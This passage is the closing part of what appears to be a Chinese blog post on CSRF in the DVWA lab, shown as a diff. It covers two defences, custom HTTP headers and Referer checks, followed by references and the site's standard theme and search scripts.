+<h3 id="使用定制的HTTP报头："><a href="#使用定制的HTTP报头：" class="headerlink" title="使用定制的HTTP报头："></a>使用定制的HTTP报头：</h3><p>如果执行交易的所有请求都使用XMLHttpRequest并附加一个定制的HTTP报头，同时拒绝缺少定制报头的任何请求，就可以用XMLHttpRequest API来防御CSRF攻击。由于浏览器通常仅准许站点将定制的HTTP报头发送给相同站点，从而了防止由CSRF攻击的源站点所发起的交易。</p>
+<h3 id="检查访问源的报头："><a href="#检查访问源的报头：" class="headerlink" title="检查访问源的报头："></a>检查访问源的报头：</h3><p>在浏览者发送HTTP请求时，它通常会包含源自访问源报头的URL。理论上讲，你可以使用这些信息来阻止源自其它任何站点（而不是来自Web应用程序自身）的请求。不过，访问源报头并不总是可用的，（例如，有些单位由于私密性的缘故而将它剥离了），或者这个报头容易被欺骗，所以说，这条措施并不真正有效。 </p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.freebuf.com/column/153543.html" target="_blank" rel="noopener">白帽子挖洞—跨站请求伪造（CSRF）篇</a></p>
+<p><a href="http://www.storysec.com/dvwa-csrf.html" target="_blank" rel="noopener">DVWA CSRF 通关教程</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+          
+            <a href="/tags/DVWA/" rel="tag"># DVWA</a>
+          
+            <a href="/tags/practice/" rel="tag"># practice</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/23/DVWA-Brute_Force/" rel="next" title="DVWA-Brute_Force">
+                <i class="fa fa-chevron-left"></i> DVWA-Brute_Force
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Ahodor</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Cross-Site-Request-Forgery-CSRF"><span class="nav-number">1.</span> <span class="nav-text">Cross Site Request Forgery (CSRF)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Introduction"><span class="nav-number">1.1.</span> <span class="nav-text">Introduction</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#跨站脚本（XSS）与跨站请求伪造-CSRF-区别"><span class="nav-number">1.1.1.</span> <span class="nav-text">跨站脚本（XSS）与跨站请求伪造(CSRF)区别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low"><span class="nav-number">1.2.</span> <span class="nav-text">Low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端源代码"><span class="nav-number">1.2.1.</span> <span class="nav-text">服务端源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">1.2.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Middle"><span class="nav-number">1.3.</span> <span class="nav-text">Middle</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端源代码-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">服务端源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192-168-xx-xx）"><span class="nav-number">1.3.3.0.1.</span> <span class="nav-text">过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.xx.xx）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High"><span class="nav-number">1.4.</span> <span class="nav-text">High</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端源代码-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">服务端源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">1.4.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible"><span class="nav-number">1.5.</span> <span class="nav-text">Impossible</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端源代码-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">服务端源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-3"><span class="nav-number">1.5.2.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF漏洞的分类及检测挖掘方法主要有三种："><span class="nav-number">1.6.</span> <span class="nav-text">CSRF漏洞的分类及检测挖掘方法主要有三种：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一种："><span class="nav-number">1.6.1.</span> <span class="nav-text">第一种：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#检测方法："><span class="nav-number">1.6.1.1.</span> <span class="nav-text">检测方法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二种："><span class="nav-number">1.6.2.</span> <span class="nav-text">第二种：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#检测方法：-1"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">检测方法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三种："><span class="nav-number">1.6.3.</span> <span class="nav-text">第三种：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#检测方法：-2"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">检测方法：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防护措施"><span class="nav-number">1.7.</span> <span class="nav-text">防护措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#限制验证cookie的到期时间："><span class="nav-number">1.7.1.</span> <span class="nav-text">限制验证cookie的到期时间：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行重要业务之前，要求用户提交额外的信息："><span class="nav-number">1.7.2.</span> <span class="nav-text">执行重要业务之前，要求用户提交额外的信息：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用秘密的无法预测的验证符号："><span class="nav-number">1.7.3.</span> <span class="nav-text">使用秘密的无法预测的验证符号：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用定制的HTTP报头："><span class="nav-number">1.7.4.</span> <span class="nav-text">使用定制的HTTP报头：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检查访问源的报头："><span class="nav-number">1.7.5.</span> <span class="nav-text">检查访问源的报头：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.8.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ahodor</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+-->
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
